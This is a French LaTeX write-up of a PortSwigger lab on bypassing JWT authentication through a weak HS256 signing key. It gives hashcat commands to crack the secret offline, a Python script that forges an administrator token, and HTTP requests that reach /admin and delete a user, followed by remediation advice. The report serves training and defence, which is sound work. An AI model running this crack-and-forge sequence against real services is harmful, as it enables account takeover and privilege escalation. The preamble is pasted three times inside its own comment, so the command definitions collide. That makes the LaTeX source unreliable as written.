% =====================================================================
%  Rapport de sécurité - JWT authentication bypass via weak signing key
%  Compilation : latexmk -pdf jwt-weak-signing-key.tex
% =====================================================================
\documentclass[11pt,a4paper]{article}
% =====================================================================
%  Préambule commun - Rapports de sécurité
%  Inclus par chaque rapport après \documentclass, avant \begin{document} :
%      \documentclass[11pt,a4paper]{article}
%      % =====================================================================
%  Préambule commun - Rapports de sécurité
%  Inclus par chaque rapport après \documentclass, avant \begin{document} :
%      \documentclass[11pt,a4paper]{article}
%      % =====================================================================
%  Préambule commun - Rapports de sécurité
%  Inclus par chaque rapport après \documentclass, avant \begin{document} :
%      \documentclass[11pt,a4paper]{article}
%      \input{../../templates/preambule.tex}
%      \begin{document} ... \end{document}
%
%  Moteur : pdflatex (compiler deux fois pour la table des matières, ou
%  utiliser latexmk -pdf).
% =====================================================================

\usepackage[T1]{fontenc}
\usepackage[utf8]{inputenc}
\usepackage{lmodern}
\usepackage[french]{babel}
\usepackage{csquotes}
\frenchsetup{StandardItemLabels=true}
\usepackage{amsmath}

\usepackage[margin=2.5cm]{geometry}
\usepackage{graphicx}
\usepackage{float}
\usepackage{xcolor}
\usepackage{array}
\usepackage{booktabs}
\usepackage{enumitem}
\usepackage{listings}
\usepackage{tcolorbox}
\tcbuselibrary{skins,breakable}
\usepackage[hidelinks]{hyperref}

% ---------------------------------------------------------------------
%  Palette
% ---------------------------------------------------------------------
\definecolor{codebg}{RGB}{245,246,248}
\definecolor{codeframe}{RGB}{210,214,220}
\definecolor{codekw}{RGB}{170,40,60}
\definecolor{codestr}{RGB}{30,110,70}
\definecolor{codecmt}{RGB}{120,125,135}
\definecolor{accent}{RGB}{30,70,120}
\definecolor{warnbg}{RGB}{255,247,230}
\definecolor{warnframe}{RGB}{224,168,64}
\definecolor{keybg}{RGB}{235,240,248}
\definecolor{keyframe}{RGB}{120,150,190}

% ---------------------------------------------------------------------
%  Listings (blocs de code encadrés, monospace)
% ---------------------------------------------------------------------
\lstdefinestyle{report}{
  backgroundcolor=\color{codebg},
  frame=single,
  rulecolor=\color{codeframe},
  basicstyle=\ttfamily\small,
  keywordstyle=\color{codekw}\bfseries,
  stringstyle=\color{codestr},
  commentstyle=\color{codecmt}\itshape,
  numbers=none,
  breaklines=true,
  breakatwhitespace=false,
  showstringspaces=false,
  columns=fullflexible,
  keepspaces=true,
  xleftmargin=8pt,
  xrightmargin=8pt,
  aboveskip=10pt,
  belowskip=10pt,
  literate=%
    {é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1 {à}{{\`a}}1 {ç}{{\c c}}1
    {É}{{\'E}}1 {î}{{\^i}}1 {ï}{{\"i}}1 {ô}{{\^o}}1 {û}{{\^u}}1
    {ù}{{\`u}}1 {œ}{{\oe}}1 {»}{{\guillemotright}}1 {«}{{\guillemotleft}}1
}
\lstset{style=report}

% ---------------------------------------------------------------------
%  Captures d'écran : image + légende en italique (sans « Figure N »)
%  \shot{fichier.png}{légende}
%  Si l'image manque, un cadre de remplacement est affiché.
% ---------------------------------------------------------------------
\newcommand{\shot}[2]{%
  \begin{center}%
    \IfFileExists{images/#1}%
      {\includegraphics[width=0.92\linewidth]{images/#1}}%
      {\setlength{\fboxsep}{0pt}\fcolorbox{codeframe}{codebg}{%
         \parbox[c][3.2cm][c]{0.92\linewidth}{\centering\ttfamily\small
         images/#1\\[4pt]\normalfont\itshape(capture à ajouter)}}}%
    \\[5pt]{\itshape\small #2}%
  \end{center}%
}

% ---------------------------------------------------------------------
%  Encadrés « points clés » (bleu) et « attention » (orange)
% ---------------------------------------------------------------------
\newtcolorbox{keybox}[1][]{
  breakable, colback=keybg, colframe=keyframe, boxrule=0.6pt,
  arc=2pt, left=8pt, right=8pt, top=6pt, bottom=6pt, #1}
\newtcolorbox{warnbox}[1][]{
  breakable, colback=warnbg, colframe=warnframe, boxrule=0.6pt,
  arc=2pt, left=8pt, right=8pt, top=6pt, bottom=6pt, #1}

\setlist[itemize]{leftmargin=1.4em, itemsep=2pt, topsep=4pt}

% ---------------------------------------------------------------------
%  Page de garde + table des matières
%  \makecover{titre}{sous-titre}{lignes méta}{auteur}{date}
%  Les lignes méta s'écrivent avec \metarow{Étiquette}{Valeur}.
% ---------------------------------------------------------------------
\newcommand{\metarow}[2]{\textbf{#1} & #2 \\}
\newcommand{\makecover}[5]{%
  \begin{titlepage}
    \centering
    \vspace*{1.2cm}
    {\large\scshape Rapport de sécurité}\par
    \vspace{1.6cm}
    {\huge\bfseries #1\par}
    \vspace{0.5cm}
    {\Large #2\par}
    \vspace{2.2cm}
    \begin{tcolorbox}[width=0.86\textwidth, colback=codebg,
        colframe=codeframe, boxrule=0.8pt, arc=3pt, left=12pt, right=12pt,
        top=10pt, bottom=10pt]
      \renewcommand{\arraystretch}{1.35}%
      \begin{tabular}{@{}r@{\hspace{1.2em}}p{0.62\textwidth}@{}}
        #3
      \end{tabular}
    \end{tcolorbox}
    \vfill
    {\large #4\par}
    \vspace{0.3cm}
    {#5\par}
  \end{titlepage}
  \tableofcontents
  \newpage
}

%      \begin{document} ... \end{document}
%
%  Moteur : pdflatex (compiler deux fois pour la table des matières, ou
%  utiliser latexmk -pdf).
% =====================================================================

\usepackage[T1]{fontenc}
\usepackage[utf8]{inputenc}
\usepackage{lmodern}
\usepackage[french]{babel}
\usepackage{csquotes}
\frenchsetup{StandardItemLabels=true}
\usepackage{amsmath}

\usepackage[margin=2.5cm]{geometry}
\usepackage{graphicx}
\usepackage{float}
\usepackage{xcolor}
\usepackage{array}
\usepackage{booktabs}
\usepackage{enumitem}
\usepackage{listings}
\usepackage{tcolorbox}
\tcbuselibrary{skins,breakable}
\usepackage[hidelinks]{hyperref}

% ---------------------------------------------------------------------
%  Palette
% ---------------------------------------------------------------------
\definecolor{codebg}{RGB}{245,246,248}
\definecolor{codeframe}{RGB}{210,214,220}
\definecolor{codekw}{RGB}{170,40,60}
\definecolor{codestr}{RGB}{30,110,70}
\definecolor{codecmt}{RGB}{120,125,135}
\definecolor{accent}{RGB}{30,70,120}
\definecolor{warnbg}{RGB}{255,247,230}
\definecolor{warnframe}{RGB}{224,168,64}
\definecolor{keybg}{RGB}{235,240,248}
\definecolor{keyframe}{RGB}{120,150,190}

% ---------------------------------------------------------------------
%  Listings (blocs de code encadrés, monospace)
% ---------------------------------------------------------------------
\lstdefinestyle{report}{
  backgroundcolor=\color{codebg},
  frame=single,
  rulecolor=\color{codeframe},
  basicstyle=\ttfamily\small,
  keywordstyle=\color{codekw}\bfseries,
  stringstyle=\color{codestr},
  commentstyle=\color{codecmt}\itshape,
  numbers=none,
  breaklines=true,
  breakatwhitespace=false,
  showstringspaces=false,
  columns=fullflexible,
  keepspaces=true,
  xleftmargin=8pt,
  xrightmargin=8pt,
  aboveskip=10pt,
  belowskip=10pt,
  literate=%
    {é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1 {à}{{\`a}}1 {ç}{{\c c}}1
    {É}{{\'E}}1 {î}{{\^i}}1 {ï}{{\"i}}1 {ô}{{\^o}}1 {û}{{\^u}}1
    {ù}{{\`u}}1 {œ}{{\oe}}1 {»}{{\guillemotright}}1 {«}{{\guillemotleft}}1
}
\lstset{style=report}

% ---------------------------------------------------------------------
%  Captures d'écran : image + légende en italique (sans « Figure N »)
%  \shot{fichier.png}{légende}
%  Si l'image manque, un cadre de remplacement est affiché.
% ---------------------------------------------------------------------
\newcommand{\shot}[2]{%
  \begin{center}%
    \IfFileExists{images/#1}%
      {\includegraphics[width=0.92\linewidth]{images/#1}}%
      {\setlength{\fboxsep}{0pt}\fcolorbox{codeframe}{codebg}{%
         \parbox[c][3.2cm][c]{0.92\linewidth}{\centering\ttfamily\small
         images/#1\\[4pt]\normalfont\itshape(capture à ajouter)}}}%
    \\[5pt]{\itshape\small #2}%
  \end{center}%
}

% ---------------------------------------------------------------------
%  Encadrés « points clés » (bleu) et « attention » (orange)
% ---------------------------------------------------------------------
\newtcolorbox{keybox}[1][]{
  breakable, colback=keybg, colframe=keyframe, boxrule=0.6pt,
  arc=2pt, left=8pt, right=8pt, top=6pt, bottom=6pt, #1}
\newtcolorbox{warnbox}[1][]{
  breakable, colback=warnbg, colframe=warnframe, boxrule=0.6pt,
  arc=2pt, left=8pt, right=8pt, top=6pt, bottom=6pt, #1}

\setlist[itemize]{leftmargin=1.4em, itemsep=2pt, topsep=4pt}

% ---------------------------------------------------------------------
%  Page de garde + table des matières
%  \makecover{titre}{sous-titre}{lignes méta}{auteur}{date}
%  Les lignes méta s'écrivent avec \metarow{Étiquette}{Valeur}.
% ---------------------------------------------------------------------
\newcommand{\metarow}[2]{\textbf{#1} & #2 \\}
\newcommand{\makecover}[5]{%
  \begin{titlepage}
    \centering
    \vspace*{1.2cm}
    {\large\scshape Rapport de sécurité}\par
    \vspace{1.6cm}
    {\huge\bfseries #1\par}
    \vspace{0.5cm}
    {\Large #2\par}
    \vspace{2.2cm}
    \begin{tcolorbox}[width=0.86\textwidth, colback=codebg,
        colframe=codeframe, boxrule=0.8pt, arc=3pt, left=12pt, right=12pt,
        top=10pt, bottom=10pt]
      \renewcommand{\arraystretch}{1.35}%
      \begin{tabular}{@{}r@{\hspace{1.2em}}p{0.62\textwidth}@{}}
        #3
      \end{tabular}
    \end{tcolorbox}
    \vfill
    {\large #4\par}
    \vspace{0.3cm}
    {#5\par}
  \end{titlepage}
  \tableofcontents
  \newpage
}

%      \begin{document} ... \end{document}
%
%  Moteur : pdflatex (compiler deux fois pour la table des matières, ou
%  utiliser latexmk -pdf).
% =====================================================================

\usepackage[T1]{fontenc}
\usepackage[utf8]{inputenc}
\usepackage{lmodern}
\usepackage[french]{babel}
\usepackage{csquotes}
\frenchsetup{StandardItemLabels=true}
\usepackage{amsmath}

\usepackage[margin=2.5cm]{geometry}
\usepackage{graphicx}
\usepackage{float}
\usepackage{xcolor}
\usepackage{array}
\usepackage{booktabs}
\usepackage{enumitem}
\usepackage{listings}
\usepackage{tcolorbox}
\tcbuselibrary{skins,breakable}
\usepackage[hidelinks]{hyperref}

% ---------------------------------------------------------------------
%  Palette
% ---------------------------------------------------------------------
\definecolor{codebg}{RGB}{245,246,248}
\definecolor{codeframe}{RGB}{210,214,220}
\definecolor{codekw}{RGB}{170,40,60}
\definecolor{codestr}{RGB}{30,110,70}
\definecolor{codecmt}{RGB}{120,125,135}
\definecolor{accent}{RGB}{30,70,120}
\definecolor{warnbg}{RGB}{255,247,230}
\definecolor{warnframe}{RGB}{224,168,64}
\definecolor{keybg}{RGB}{235,240,248}
\definecolor{keyframe}{RGB}{120,150,190}

% ---------------------------------------------------------------------
%  Listings (blocs de code encadrés, monospace)
% ---------------------------------------------------------------------
\lstdefinestyle{report}{
  backgroundcolor=\color{codebg},
  frame=single,
  rulecolor=\color{codeframe},
  basicstyle=\ttfamily\small,
  keywordstyle=\color{codekw}\bfseries,
  stringstyle=\color{codestr},
  commentstyle=\color{codecmt}\itshape,
  numbers=none,
  breaklines=true,
  breakatwhitespace=false,
  showstringspaces=false,
  columns=fullflexible,
  keepspaces=true,
  xleftmargin=8pt,
  xrightmargin=8pt,
  aboveskip=10pt,
  belowskip=10pt,
  literate=%
    {é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1 {à}{{\`a}}1 {ç}{{\c c}}1
    {É}{{\'E}}1 {î}{{\^i}}1 {ï}{{\"i}}1 {ô}{{\^o}}1 {û}{{\^u}}1
    {ù}{{\`u}}1 {œ}{{\oe}}1 {»}{{\guillemotright}}1 {«}{{\guillemotleft}}1
}
\lstset{style=report}

% ---------------------------------------------------------------------
%  Captures d'écran : image + légende en italique (sans « Figure N »)
%  \shot{fichier.png}{légende}
%  Si l'image manque, un cadre de remplacement est affiché.
% ---------------------------------------------------------------------
\newcommand{\shot}[2]{%
  \begin{center}%
    \IfFileExists{images/#1}%
      {\includegraphics[width=0.92\linewidth]{images/#1}}%
      {\setlength{\fboxsep}{0pt}\fcolorbox{codeframe}{codebg}{%
         \parbox[c][3.2cm][c]{0.92\linewidth}{\centering\ttfamily\small
         images/#1\\[4pt]\normalfont\itshape(capture à ajouter)}}}%
    \\[5pt]{\itshape\small #2}%
  \end{center}%
}

% ---------------------------------------------------------------------
%  Encadrés « points clés » (bleu) et « attention » (orange)
% ---------------------------------------------------------------------
\newtcolorbox{keybox}[1][]{
  breakable, colback=keybg, colframe=keyframe, boxrule=0.6pt,
  arc=2pt, left=8pt, right=8pt, top=6pt, bottom=6pt, #1}
\newtcolorbox{warnbox}[1][]{
  breakable, colback=warnbg, colframe=warnframe, boxrule=0.6pt,
  arc=2pt, left=8pt, right=8pt, top=6pt, bottom=6pt, #1}

\setlist[itemize]{leftmargin=1.4em, itemsep=2pt, topsep=4pt}

% ---------------------------------------------------------------------
%  Page de garde + table des matières
%  \makecover{titre}{sous-titre}{lignes méta}{auteur}{date}
%  Les lignes méta s'écrivent avec \metarow{Étiquette}{Valeur}.
% ---------------------------------------------------------------------
\newcommand{\metarow}[2]{\textbf{#1} & #2 \\}
\newcommand{\makecover}[5]{%
  \begin{titlepage}
    \centering
    \vspace*{1.2cm}
    {\large\scshape Rapport de sécurité}\par
    \vspace{1.6cm}
    {\huge\bfseries #1\par}
    \vspace{0.5cm}
    {\Large #2\par}
    \vspace{2.2cm}
    \begin{tcolorbox}[width=0.86\textwidth, colback=codebg,
        colframe=codeframe, boxrule=0.8pt, arc=3pt, left=12pt, right=12pt,
        top=10pt, bottom=10pt]
      \renewcommand{\arraystretch}{1.35}%
      \begin{tabular}{@{}r@{\hspace{1.2em}}p{0.62\textwidth}@{}}
        #3
      \end{tabular}
    \end{tcolorbox}
    \vfill
    {\large #4\par}
    \vspace{0.3cm}
    {#5\par}
  \end{titlepage}
  \tableofcontents
  \newpage
}


\begin{document}

\makecover
  {JWT authentication bypass via weak signing key}
  {CWE-326 \textperiodcentered{} OWASP A02\string:2021}
  {
    \metarow{Lab}{JWT authentication bypass via weak signing key}
    \metarow{Classe}{Authentification (JWT)}
    \metarow{Difficulté}{Practitioner}
    \metarow{Cible}{Mécanisme de session JWT (HS256)}
    \metarow{Plateforme}{PortSwigger Web Security Academy}
  }
  {Lucas Fagioli}
  {15 septembre 2026}

% =====================================================================
\section{Contexte}
% =====================================================================
L'application gère les sessions avec un \textbf{JSON Web Token} (JWT) signé en
\texttt{HS256}, un algorithme symétrique : la même clé secrète sert à signer le
jeton et à vérifier sa signature. Toute la sécurité repose donc sur le fait que
cette clé reste inconnue de l'attaquant.

Ici la clé de signature est \textbf{faible} : c'est un secret court et
prévisible, présent dans des listes publiques. Un attaquant peut le retrouver
hors ligne à partir d'un seul jeton, puis \textbf{forger n'importe quel jeton
valide}, dont un jeton administrateur, et accéder à l'interface
d'administration réservée.

\begin{itemize}
  \item \textbf{Point faible} : le secret HMAC utilisé pour signer les JWT est brute-forçable.
  \item \textbf{Objectif} : forger un jeton avec \texttt{sub = administrator}, atteindre \texttt{/admin} et supprimer l'utilisateur \texttt{carlos}.
\end{itemize}

\subsection{Environnement}
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{@{}p{0.30\textwidth}p{0.62\textwidth}@{}}
  \textbf{Système}        & Kali Linux \\
  \textbf{Proxy}          & Burp Suite Community Edition (Repeater) \\
  \textbf{Cassage}        & \texttt{hashcat} (mode 16500, JWT) \\
  \textbf{Wordlist}       & \texttt{jwt.secrets.list} (dépôt \texttt{wallarm/jwt-secrets}) \\
  \textbf{Forge}          & script Python (bibliothèque standard : \texttt{hmac}, \texttt{hashlib}) \\
  \textbf{Cible}          & Instance de lab PortSwigger, \texttt{*.web-security-academy.net} \\
\end{tabular}

\shot{01-lab-not-solved.png}{État initial du lab, non résolu.}

% =====================================================================
\section{Reconnaissance}
% =====================================================================
Le lab fournit un compte de test. On se connecte via \emph{My account} avec les
identifiants \texttt{wiener:peter}.

\shot{02-login-wiener.png}{Connexion avec le compte fourni \texttt{wiener}.}

Une fois connecté, le serveur pose un cookie de session. Dans l'historique du
proxy Burp, la requête vers \texttt{/my-account} porte un cookie
\texttt{session} dont la valeur est un JWT : trois parties séparées par des
points (\texttt{en-tête.charge.signature}).

\shot{03-session-jwt-in-burp.png}{Cookie \texttt{session} (le JWT) dans la requête interceptée par Burp.}

L'interface d'administration est, elle, hors de portée : y accéder en tant que
\texttt{wiener} renvoie un message indiquant qu'elle est réservée aux
administrateurs.

\shot{04-admin-denied-as-wiener.png}{Accès à \texttt{/admin} refusé pour \texttt{wiener}.}

On décode le JWT (par exemple sur \texttt{jwt.io}, ou en base64url) pour
comprendre ce qu'il faudra reproduire. L'en-tête révèle l'algorithme, la charge
contient l'identité :

\begin{lstlisting}
En-tete : {"kid":"e8b4ea30-...","alg":"HS256"}
Charge  : {"iss":"portswigger","exp":1789472166,"sub":"wiener"}
\end{lstlisting}

\shot{05-jwt-decoded-hs256.png}{JWT décodé : algorithme \texttt{HS256} et \texttt{sub = wiener}.}

Deux enseignements : la signature est \textbf{symétrique} (\texttt{HS256}, donc
cassable si le secret est faible), et l'identité de l'utilisateur tient dans la
claim \texttt{sub}. Il suffira de la passer à \texttt{administrator}, à
condition de savoir re-signer le jeton.

% =====================================================================
\section{Exploitation}
% =====================================================================

\subsection{Casser le secret de signature hors ligne}
La signature \texttt{HS256} est un HMAC-SHA256 du couple
\texttt{en-tête.charge}. On la soumet à \texttt{hashcat} en mode 16500 (JWT)
contre une liste de secrets faibles connus :

\begin{lstlisting}[language=bash]
wget https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list
echo '<le JWT complet>' > jwt.txt
hashcat -a 0 -m 16500 jwt.txt jwt.secrets.list
\end{lstlisting}

Le secret tombe instantanément : il figure dans la wordlist. hashcat affiche le
jeton suivi de sa clé, \texttt{...:secret1}, avec le statut \texttt{Cracked}.

\shot{06-hashcat-secret-cracked.png}{\texttt{hashcat} retrouve le secret \texttt{secret1} (statut \texttt{Cracked}).}

\begin{keybox}
\textbf{Idée clé.}\quad Avec le secret HMAC en main, on ne \emph{contourne} pas
la vérification de signature : on produit une signature \textbf{authentique}.
Le serveur validera n'importe quel jeton qu'on lui présente, pourvu qu'il soit
signé avec \texttt{secret1}.
\end{keybox}

\subsection{Forger un jeton administrateur}
Pas besoin d'outil dédié : un JWT \texttt{HS256} se fabrique avec la seule
bibliothèque standard de Python. On repart de l'en-tête d'origine (on conserve
le \texttt{kid}), on met \texttt{sub = administrator}, puis on re-signe avec le
secret cassé.

\begin{lstlisting}[language=Python]
import base64, hmac, hashlib, json
def b64(x): return base64.urlsafe_b64encode(x).rstrip(b'=')

secret  = b'secret1'
header  = {"kid":"e8b4ea30-...","alg":"HS256"}
payload = {"iss":"portswigger","exp":2000000000,"sub":"administrator"}

h = b64(json.dumps(header,  separators=(',',':')).encode())
p = b64(json.dumps(payload, separators=(',',':')).encode())
sig = b64(hmac.new(secret, h + b'.' + p, hashlib.sha256).digest())
print((h + b'.' + p + b'.' + sig).decode())
\end{lstlisting}

Le script imprime un jeton complet et valide, dont la charge contient bien
\texttt{sub = administrator}.

\shot{07-forged-admin-token.png}{Jeton administrateur forgé et re-signé avec \texttt{secret1}.}

\begin{warnbox}
\textbf{Attention à l'expiration.}\quad La claim \texttt{exp} du jeton d'origine
est de courte durée. En la recopiant telle quelle, le serveur répond
\texttt{302} vers \texttt{/login} (jeton expiré). Comme on contrôle désormais
\emph{toutes} les claims, on fixe un \texttt{exp} lointain pour disposer d'un
jeton durablement valide.
\end{warnbox}

\subsection{Accéder à l'interface d'administration}
Dans le Repeater, on rejoue la requête en la pointant sur \texttt{/admin} et en
remplaçant le cookie \texttt{session} par le jeton forgé :

\begin{lstlisting}
GET /admin HTTP/2
Cookie: session=<jeton administrateur forgé>
\end{lstlisting}

La réponse passe de l'erreur d'accès à un \texttt{200} contenant le HTML du
panneau d'administration, avec les liens de suppression d'utilisateurs.

\shot{08-admin-panel-access.png}{Panneau d'administration atteint avec le jeton forgé.}

% =====================================================================
\section{Impact}
% =====================================================================
Un secret de signature faible réduit à néant la garantie d'authenticité du JWT.
En le retrouvant, on usurpe l'identité de n'importe quel utilisateur et on
escalade jusqu'au rôle administrateur, sans mot de passe ni interaction de la
victime. Ici, cela mène à un accès complet à l'interface d'administration et à
la suppression d'un compte :

\begin{lstlisting}
GET /admin/delete?username=carlos HTTP/2
Cookie: session=<jeton administrateur forgé>
\end{lstlisting}

\shot{09-delete-carlos.png}{Suppression de \texttt{carlos} avec le jeton forgé.}

Le lab est alors marqué comme résolu.

\shot{10-lab-solved.png}{Lab résolu.}

Dans le monde réel, la même faiblesse permet le détournement de compte à grande
échelle et le contournement de tout contrôle d'accès reposant sur le JWT, tant
que le secret n'est pas changé. L'attaque ne demande aucun privilège et se
reproduit trivialement une fois le secret connu.

Gravité indicative : \textbf{élevée}.

% =====================================================================
\section{Remédiation}
% =====================================================================
La cause racine est un secret HMAC à faible entropie, devinable par dictionnaire.

\begin{itemize}
  \item \textbf{Correctif principal} : utiliser un secret \textbf{long et aléatoire} (haute entropie, généré par un CSPRNG), jamais un mot de dictionnaire ni une valeur par défaut.
  \item \textbf{Gestion des clés} : conserver le secret dans un gestionnaire de secrets, et prévoir sa \textbf{rotation} ; en cas de fuite, révoquer et changer la clé.
  \item \textbf{Signature asymétrique} : préférer un algorithme asymétrique (\texttt{RS256}, \texttt{ES256}) ; le serveur ne détient alors que la clé publique de vérification, et la clé privée de signature n'a pas à être partagée.
  \item \textbf{Imposer l'algorithme} : fixer côté serveur l'algorithme attendu et rejeter \texttt{none} comme tout algorithme différent, pour éviter les attaques de substitution.
  \item \textbf{Durée de vie courte} : garder des \texttt{exp} brefs et associer un mécanisme de révocation, pour limiter la fenêtre d'un jeton compromis.
\end{itemize}

\vspace{4pt}
\noindent\emph{Références} : OWASP JSON Web Token Cheat Sheet ; PortSwigger Web
Security Academy, \emph{JWT attacks} ; CWE-326 (Inadequate Encryption
Strength).

\end{document}
